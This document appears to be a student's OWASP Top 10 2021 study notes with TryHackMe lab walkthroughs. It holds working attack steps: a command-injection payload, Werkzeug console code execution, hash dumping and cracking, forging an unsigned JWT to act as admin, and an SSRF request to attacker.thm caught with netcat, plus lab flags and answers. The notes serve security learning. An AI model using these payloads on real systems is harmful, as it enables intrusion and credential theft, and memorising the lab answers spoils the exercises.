@@ -1,0 +1,742 @@
+OWASP TOP 10 2021
+-----------------
+
+1. Broken Access Control
+2. Cryptographic Failures
+3. Injection
+4. Insecure Design
+5. Security Misconfiguration
+6. Vulnerable and Outdated Components
+7. Identification and Authentication Failures
+8. Software and Data Integrity Failures
+9. Security Logging and Monitoring Failures
+10. Server Side Request Forgery(SSRF)
+
+     
+1. Broken Access Control:
+   -------------------------
+
+Websites usually have pages that are protected from regular visitors and can only be accessed by admins for instance a page which can modify other users details. If these protected pages are accessed by regular users then access controls are broken. It can lead to regular visitor being able to access users sensitive information and accessing
+unauthorised functionality.
+
+Insecure Direct Object Reference (IDOR):
+---------------------------------------
+
+IDOR is a access control vulnerability where an attacker can access resources which couldn't be accessed with the privileges granted. Direct object reference could be anything a user, file, or a bank account.
+
+Most common places for IDOR:
+
+1. user profile pages
+2. resource-related operations
+3. account management functionality
+4. shopping cart and order management
+5. access control policies
+6. file upload and download functionality
+7. api endpoints
+
+Also:
+
+1. url
+2. get parameters
+3. put params
+4. post request
+5. rest api
+6. graphql
+7. IDs in cookies
+8. request handler
+
+   
+
+
+Cryptographic Failures
+   -----------------------
+
+A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels.
+
+Take, for example, a secure email application:
+
+-> When you are accessing your email account using your browser, you want to be sure that the communications between you and the server are encrypted. That way, any eavesdropper trying to capture your network packets won't be able to recover the content of your email addresses. When we encrypt the network traffic between the client and server, we usually refer to this as encrypting data in transit.
+-> Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can't read their client's emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as encrypting data at rest.
+
+Cryptographic failures often end up in web apps accidentally divulging sensitive data. This is often data directly linked to customers (e.g. names, dates of birth, financial information), but it could also be more technical information, such as usernames and passwords.
+
+At more complex levels, taking advantage of some cryptographic failures often involves techniques such as "Man in The Middle Attacks", whereby the attacker would force user connections through a device they control. Then, they would take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted in the first place). Of course, many examples are much simpler, and vulnerabilities can be found in web apps that can be exploited without advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the web server itself.
+
+The most common way to store a large amount of data in a format easily accessible from many locations is in a database. This is perfect for something like a web application, as many users may interact with the website at any time. Database engines usually follow the Structured Query Language (SQL) syntax.
+
+In a production environment, it is common to see databases set up on dedicated servers running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up an entire database server and could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.
+
+As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually, this would not be a problem for a web app, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files accessible to the user connecting to the website)? Well, we can download and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure, indeed!
+
+Testcase in Tryhackme owasp top 10 2021 cryptographic failures part:
+-------------------------------------------------
+What is the name of the mentioned directory?
+
+we've got a file in /assets directory named webapp.db which is a database file maintained by the app and could hold sensitive data of the app/users.
+
+/assets
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/cf9a8223-19ed-46d1-ba3b-d6ad3ad0555c)
+
+Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
+
+webapp.db
+![image](https://github.com/pravalika7k/Notes/assets/163530288/87ffebbf-42e7-41b7-9334-3cfbce4c1fbf)
+
+The most common (and simplest) format of a flat-file database is an SQLite database. These can be interacted with in most programming languages and have a dedicated client for querying them on the command line. This client is called sqlite3 and is installed on many Linux distributions by default.
+
+Need to access the .db file, for that first find which type of database is that db file for. we found that it's an sqllite database and a tool called sqllite3 can be used
+to make queries to the db.
+
+Use the supporting material to access the sensitive data. What is the password hash of the admin user?
+
+query -> sqllite webapp.db
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/8dc9a7c2-d210-4462-8afc-f756e578db9b)
+
+we can view the tables of the database by entering the command: .tables
+
+kali -> sqlite> .tables
+![image](https://github.com/pravalika7k/Notes/assets/163530288/0eac1941-7128-4332-980c-afcb2a4279ce)
+
+Once you get info of the tables that are present in the database, dump all the data that's present in the db to access the sensitive info that it holds.
+
+But first, before looking at the table data look at the column details to better understand the data.
+
+For that, use PRAGMA table_info(table_name);
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/c1005cc1-2971-4ec2-87ea-98c722f59bc5)
+
+then use , select * from table_name;
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/a9a26bf5-e7c0-47ed-ad26-d7abcc67876d)
+
+6eea9b7ef19179a06954edd0f6c05ceb
+
+Crack the hash.
+What is the admin's plaintext password?
+
+open https://crackstation.net/ to crack the hash
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/e0380089-161c-4213-af1b-4a83eb486c65)
+
+
+
+3. Injection
+   ---------
+
+Injection flaws occur because the application interprets user-controlled input as commands or parameters. Injection attacks are based on what technologies are used and
+how these technologies interpret the input.
+
+SQL Injection:
+--------------
+
+This occurs when user-controlled data is sent to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. This could potentially allow an attacker to access, modify or delete the information present in the database when this input is passed into database queries.This would mean an attacker could steal sensitive information such as personal details and credentials.
+
+Command Injection:
+------------------
+
+This occurs when user input is passed to system commands. As a result, an attacker can execute arbitrary system commands on app servers, potentially allowing them to access user's systems.
+
+The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:
+
+Using an allow list: when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.
+Stripping input: If the input contains dangerous characters, these are removed before processing.
+
+Dangerous characters or input is classified as any input that can change how the underlying data is processed.
+
+Command Injection occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server's console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted, just as if they were sitting in front of the server and issuing commands directly into the command line. 
+
+Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and look for ways to pivot around.
+
+What strange text file is in the website's root directory?
+![image](https://github.com/pravalika7k/Notes/assets/163530288/0199b001-5a61-4a9f-9f2a-a8c8f0598cee)
+
+How many non-root/non-service/non-daemon users are there?
+![image](https://github.com/pravalika7k/Notes/assets/163530288/c963a1ac-f846-43c8-97a1-36494c9aeb36)
+
+What user is this app running as?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/755b84d6-6ca1-4122-9b4d-7c649d2bcf05)
+
+What is the user's shell set as?
+
+A user’s shell is the program that runs when they login to a Linux system. The default shell for most users is bash, but there are many other options available. To see a list of available shells on your system, run the following command: cat /etc/shells.
+
+we can have the following shells in the system.
+[root@host ~]# cat /etc/shells
+/bin/sh
+/bin/bash
+/sbin/nologin
+/bin/dash
+/bin/zsh
+/bin/tcsh
+/bin/csh
+
+The shell is the Linux command line interpreter. It provides an interface between the user and the kernel and executes programs called commands. For example, if a user enters ls then the shell executes the ls command.
+
+/etc/passwd file is a plain text file in Linux which contains users' account information such as username, user ID, group ID, home directory, and shell. The last part of the output shows that the default shell is bash.
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/23c0dba3-c046-4545-9945-cd65377b45e3)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/9ecc42cb-037f-4cdf-b45b-cefefd954b93)
+
+What version of Alpine Linux is running?
+
+$(cat /etc/os-release)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/f9fd4e59-55da-498c-bae6-90b7757d925a)
+
+4. Insecure Design
+   -----------------
+
+   Insecure design refers to vulnerabilities which are inherent to the application's architecture. They are not vulnerabilities regarding bad implementations or configurations, but the idea behind the whole application (or a part of it) is flawed from the start. Most of the time, these vulnerabilities occur when an improper threat modelling is made during the planning phases of the application and propagate all the way up to your final app. Some other times, insecure design vulnerabilities may also be introduced by developers while adding some "shortcuts" around the code to make their testing easier. A developer could, for example, disable the OTP validation in the development phases to quickly test the rest of the app without manually inputting a code at each login but forget to re-enable it when sending the application to production.
+
+   Since insecure design vulnerabilities are introduced at such an early stage in the development process, resolving them often requires rebuilding the vulnerable part of the application from the ground up and is usually harder to do than any other simple code-related vulnerability. The best approach to avoid such vulnerabilities is to perform threat modelling at the early stages of the development lifecycle.
+
+when you'll try to reset the password of joseph, you'll come across a list of possible secret questions which you need to answer any one of it.
+
+there is a question referencing to favourite colour, brute force that parameter with all possible coulurs.
+then find the colour by variance in response size and your password will reset.
+
+enter the creds and login, you'll find the flag.
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/40fee00f-4c0f-44dd-b1e9-f35398b0c82b)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/4e99aa12-df2e-499c-a3dc-ba01b44224d4)
+
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/a4af950d-f34d-4eec-9784-75028cb3e488)
+
+
+csDLS7eCzkTdnY
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/ca92d1ac-5fd1-4055-b084-8e2216d1c8bb)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/9daa9daa-de43-4543-bb8d-387aba7642b1)
+
+Security Misconfiguration
+===================================
+
+Security Misconfigurations are distinct from the other Top 10 vulnerabilities because they occur when security could have been appropriately configured but was not. Even if you download the latest up-to-date software, poor configurations could make your installation vulnerable.
+
+Security misconfigurations include:
+
+Poorly configured permissions on cloud services, like S3 buckets.
+Having unnecessary features enabled, like services, pages, accounts or privileges.
+Default accounts with unchanged passwords.
+Error messages that are overly detailed and allow attackers to find out more about the system.
+Not using HTTP security headers.
+
+This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XML External Entities (XXE) or command injection on admin pages.
+
+Debugging Interfaces
+
+A common security misconfiguration concerns the exposure of debugging features in production software. Debugging features are often available in programming frameworks to allow the developers to access advanced functionality that is useful for debugging an application while it's being developed. Attackers could abuse some of those debug functionalities if somehow, the developers forgot to disable them before publishing their applications.
+
+One example of such a vulnerability was allegedly used when Patreon got hacked in 2015. Five days before Patreon was hacked, a security researcher reported to Patreon that he had found an open debug interface for a Werkzeug console. Werkzeug is a vital component in Python-based web applications as it provides an interface for web servers to execute the Python code. Werkzeug includes a debug console that can be accessed either via URL on /console, or it will also be presented to the user if an exception is raised by the application. In both cases, the console provides a Python console that will run any code you send to it. For an attacker, this means he can execute commands arbitrarily.
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/c87f679d-237e-4168-ac3e-60abfeb550c6)
+
+Navigate to http://10.10.242.23:86/console to access the Werkzeug console.
+
+Use the Werkzeug console to run the following Python code to execute the ls -l command on the server:
+
+import os; print(os.popen("ls -l").read())
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/0a30cd11-a3ac-4987-95e8-5a2ae419c05f)
+
+What is the database file name (the one with the .db extension) in the current directory?
+todo.db
+
+Modify the code to read the contents of the app.py file, which contains the application's source code. What is the value of the secret_flag variable in the source code?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/58b496ee-ad51-4790-a536-0dffba6e2318)
+
+Vulnerable and Outdated Components
+======================================
+
+Occasionally, you may find that the company/entity you're pen-testing is using a program with a well-known vulnerability.
+
+For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as WPScan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better, you can find an exploit already made on Exploit-DB.
+
+As you can see, this would be quite devastating because it requires very little work on the attacker's part. Since the vulnerability is already well known, someone else has likely made an exploit for the vulnerability already. The situation worsens when you realise that it's really easy for this to happen. If a company misses a single update for a program they use, it could be vulnerable to any number of attacks.
+
+lab:
+
+look for exploits related to bootstrap, php or online book store in exploitdb and searchsploit.
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/a182ab89-6f86-4bbf-b784-4cdd7cd217ff)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/dd20ba97-84b9-495a-8c9b-939865100213)
+
+use the unauthenticated rce exploit
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/ee8d11a1-4fdf-48af-9d1c-750a7973c84b)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/4b56695e-1af0-4e69-a42f-67186ef001f7)
+
+What is the content of the /opt/flag.txt file?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/7e872e43-9c3c-4734-bf80-bb0506eb814c)
+
+7. Identification and Authentication Failures
+   -------------------------------------------
+
+   Authentication and session management are core components of web apps.
+   Authentications allows users to gain access to the apps by verifying their identities.
+   Most commonly used authentication mode is using username and password.
+   Server generates a token upon verifying the credentials entered by the user.
+   As HTTPS is stateless, cookie needs to be submitted on every request for identifying who's sending the data, tracking user's actions etc.
+
+   If an attacker could find flaws in the authentication mechanism, they might successfully gain access to other user account resulting in sensitive data disclosure.
+
+   Brute force attacks: If a web application uses usernames and passwords, an attacker can try to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. 
+Use of weak credentials: Web applications should set strong password policies. If applications allow users to set passwords such as "password1" or common passwords, an attacker can easily guess them and access user accounts.
+Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, attackers can set their own session cookies and access users' accounts.
+
+Migitation for broken authentication:
+
+> To avoid password guessing attacks, ensure the application enforces a strong password policy.
+> To avoid brute-force attacks, ensure app enforce an account lockout policy after a certain number of attempts.
+> Implement multi-factor authentication.
+
+Lab:
+
+Many times, what happens is that developers forget to sanitise the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we will focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit, i.e. re-registration of an existing user.
+
+Let's understand this with the help of an example, say there is an existing user with the name admin, and we want access to their account, so what we can do is try to re-register that username but with slight modification. We will enter " admin" without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user admin.
+
+To see this in action, go to http://10.10.6.199:8088 and try to register with darren as your username. You'll see that the user already exists, so try to register " darren" instead, and you'll see that you are now logged in and can see the content present only in darren's account, which in our case, is the flag that you need to retrieve.
+
+What is the flag that you found in darren's account?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/d270a943-bc37-43c8-9942-a81a4be1ed82)
+
+Now try to do the same trick and see if you can log in as arthur.
+
+What is the flag that you found in arthur's account?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/4f6bbbeb-9e3e-4edd-9ac8-bc176b503323)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/3f9e9c0f-8230-4d85-96cf-3029919ed19c)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/cd084b27-52a6-4ffc-b051-6b10d97f219c)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/f68ba442-25c6-4f01-92fa-58497370071f)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/bcd00916-e261-45fc-9876-bbd919367085)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/74c62213-0b87-4702-904b-7ba2ac1a9d3c)
+
+d9ac0f7db4fda460ac3edeb75d75e16e 
+
+8. Software and Data Integrity Failures
+   -------------------------------------------
+
+   What is Integrity?
+
+When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified. Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications. For example, say you are downloading the latest installer for an application. How can you be sure that while downloading it, it wasn't modified in transit or somehow got damaged by a transmission error?
+
+To overcome this problem, you will often see a hash sent alongside the file so that you can prove that the file you downloaded kept its integrity and wasn't modified in transit. A hash or digest is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about MD5, SHA1, SHA256 or many others available.
+
+Let's take WinSCP as an example to understand better how we can use hashes to check a file's integrity. If you go to their Sourceforge repository, you'll see that for each file available to download, there are some hashes published along:
+
+WinSCP hashes
+
+These hashes were precalculated by the creators of WinSCP so that you can check the file's integrity after downloading. If we download the WinSCP-5.21.5-Setup.exe file, we can recalculate the hashes and compare them against the ones published in Sourceforge. To calculate the different hashes in Linux, we can use the following commands:
+user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          
+20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
+                                                                                                                
+user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
+c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe
+                                                                                                                
+user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
+e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
+
+Since we got the same hashes, we can safely conclude that the file we downloaded is an exact copy of the one on the website.
+
+Software and Data Integrity Failures
+
+This vulnerability arises from code or infrastructure that uses software or data without using any kind of integrity checks. Since no integrity verification is being done, an attacker might modify the software or data passed to the application, resulting in unexpected consequences. There are mainly two types of vulnerabilities in this category:
+
+Software Integrity Failures
+Data Integrity Failures
+
+Software Integrity Failures
+--------------------------
+Software Integrity Failures
+
+Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control. While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:
+
+<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/9963dea1-48b3-4861-979e-4437b8b1e18f)
+
+The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of https://code.jquery.com/jquery-3.6.1.min.js to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI)
+
+The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version. Here's how that should look in HTML:
+
+<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+You can go to https://www.srihash.org/ to generate hashes for any library if needed.
+
+What is the SHA-256 hash of https://code.jquery.com/jquery-1.12.4.min.js?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/6998b050-a4b4-498f-a9e0-b8eb24a787df)
+
+sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=
+
+Data Integrity Failures
+-------------------------
+
+﻿Data Integrity Failures
+
+Let's think of how web applications maintain sessions. Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. Cookies are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them.
+
+For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user's browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.
+
+One solution to this is to use some integrity mechanism to guarantee that the cookie hasn't been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is JSON Web Tokens (JWT).
+
+JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. The structure of a JWT token is formed of 3 parts:
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/4f1e3b4f-0e1c-4efe-ac89-5d9ad5cdf9f5)
+
+The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash, taken to verify the payload's integrity. If you change the payload, the web application can verify that the signature won't match the payload and know that you tampered with the JWT. Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won't be able to generate the matching signature unless you know the secret key.
+
+Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use this online tool to encode/decode base64. Try decoding the header and payload of the following token:
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw
+
+Note: The signature contains binary data, so even if you decode it, you won't be able to make much sense of it anyways.
+
+JWT and the None Algorithm
+
+A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:
+
+Modify the header section of the token so that the alg header would contain the value none.
+Remove the signature part.
+Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/4ea75d69-1b3d-48c5-b1ff-7da111856333)
+
+Try logging into the application as guest. What is guest's account password?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/ce1f60e1-9020-4c9b-89d6-8b7656f04456)
+
+guest
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/9f07f9ad-aa66-470e-b64f-e21c9c2f6b81)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/42477097-58d3-4ff1-9198-3ef7162dd8e1)
+
+2. What is the name of the website's cookie containing a JWT token?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/6256629f-f9c9-4176-9644-3c06dd30c3b2)
+
+jwt-session
+
+Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".
+
+What is the flag presented to the admin user?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/9ac758b4-7346-43c3-91be-6a3812372de1)
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzEyMjMzNTkzfQ.9kb3-g7rkI3EM133nzN5u-luOAVx4K36kQawvs89m4I
+
+this is guest user's jwt token.
+
+now we will have to modify the token to get access to admin console.
+
+for that edit the values in head and payload by first decoding them from base64, make changes and encode to base64 again.
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
+
+use this site for encoding and decoding:
+
+https://appdevtools.com/base64-encoder-decoder
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/ab683f1f-1b1b-45bb-83a3-7415fad13a0c)
+
+now make changes to decoded head part in algorithm parameter by changing it to "none".
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/d4132fff-8be4-46a5-86c3-d64876d34f90)
+
+modified head value: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
+
+now it's time to change payload.
+
+eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzEyMjMzNTkzfQ - old payload
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/582a6d90-337d-4739-ab1b-d18e2c8e7cbd)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/8d2dbcf5-1909-45e9-bbfb-2b09320c89dd)
+
+new payload:
+
+eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzEyMjMzNTkzfQ==
+
+new jwt token :
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzEyMjMzNTkzfQ==
+
+modify the cookie in browser to new token to get access to admin console.
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/95345038-86a0-49ad-8272-ceda8fa00d4d)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/edf50b30-3e18-4eb3-b8df-0f640fa29648)
+
+don't forget to add . at the end of payload
+
+THM{Dont_take_cookies_from_strangers}
+
+9. Security Logging and Monitoring Failures
+   -------------------------------------------------
+
+When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers' activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:
+
+Regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.
+Risk of further attacks: an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.
+The information stored in logs should include the following:
+
+HTTP status codes
+Time Stamps
+Usernames
+API endpoints/page locations
+IP addresses
+These logs have some sensitive information, so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.
+
+As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity include:
+
+Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)
+Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
+Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.
+Common payloads: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.
+Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will have a higher impact than others. These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties' attention.
+
+Put this knowledge to practice by analysing the provided sample log file. You can download it by clicking the Download Task Files button at the top of the task.
+
+Answer the questions below
+What IP address is the attacker using?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/765ccf90-15d3-4e35-899f-2bb67b33f331)
+
+unauthorised status code, multiple tries from same IP
+
+What kind of attack is being carried out?
+
+bruteforce
+
+10. Server-Side Request Forgery (SSRF)
+    -------------------------------------
+
+Server-Side Request Forgery
+
+This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.
+
+Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/00eabc7e-e2ef-42f7-bcfa-14c6d9eaa876)
+
+By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the server parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the server to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:
+
+https://www.mysite.com/sms?server=attacker.thm&msg=ABC
+
+This would make the vulnerable web application make a request to:
+
+https://attacker.thm/api/send?msg=ABC 
+
+You could then just capture the contents of the request using Netcat:
+
+user@attackbox$ nc -lvp 80
+Listening on 0.0.0.0 80
+Connection received on 10.10.1.236 43830
+GET /:8087/public-docs/123.pdf HTTP/1.1
+Host: 10.10.10.11
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+Accept: */*
+
+This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:
+
+Enumerate internal networks, including IP addresses and ports.
+Abuse trust relationships between servers and gain access to otherwise restricted services.
+Interact with some non-HTTP services to get remote code execution (RCE).
+Let's quickly look at how we can use SSRF to abuse some trust relationships.
+
+Practical Example
+
+Navigate to http://10.10.6.199:8087/, where you'll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website's restricted area!
+
+Answer the questions below
+Explore the website. What is the only host allowed to access the admin area?
+
+    ![image](https://github.com/pravalika7k/Notes/assets/163530288/6b46c4c1-c3d2-48b8-b766-afd4de62bd3d)
+
+Check the "Download Resume" button. Where does the server parameter point to?
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/b08c2a79-59ab-4a25-b87f-3f95508b9e14)
+
+Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?
+
+THM{Hello_Im_just_an_API_key}
+
+In the below request, modify the site to your attack box ip and send the request while adding a listener to it through netcat.
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/36d23f6c-162a-49df-ba7e-1591ac88c8d6)
+
+![image](https://github.com/pravalika7k/Notes/assets/163530288/3e96c1bf-0d13-4401-990f-1a41153f34e8)
+
+### difference between csrf and ssrf
+
+csrf is allowing a client/victim to visit a specific link on particular action. so in case of csrf, client is requesting for a link/endpoint and that endpoint is defined by the attacker. 
+
+eg: delete your account, add attacker account into yours etc
+
+In case of ssrf, things remain same the only difference is that instead of client the server makes a request to the endpoint that an attacker wants to.
+
+what is the need of ssrf when various attacks like csrf etc are ready for exploiting?
+
